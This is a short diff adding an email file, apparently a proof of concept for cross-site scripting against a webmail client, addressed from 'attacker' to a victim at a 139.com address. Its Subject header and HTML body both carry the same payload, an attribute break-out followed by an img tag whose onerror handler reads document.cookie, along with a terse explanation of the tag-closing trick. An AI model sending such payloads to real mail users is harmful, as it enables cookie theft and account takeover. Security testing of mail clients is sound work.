@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: "> <img src="#" onerror="alert(document.cookie)" >use a to do some with onclick; use > to close a;
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: text/html
+
+"> <img src="#" onerror="alert(document.cookie)" >use a to do some with onclick; use > to close a;
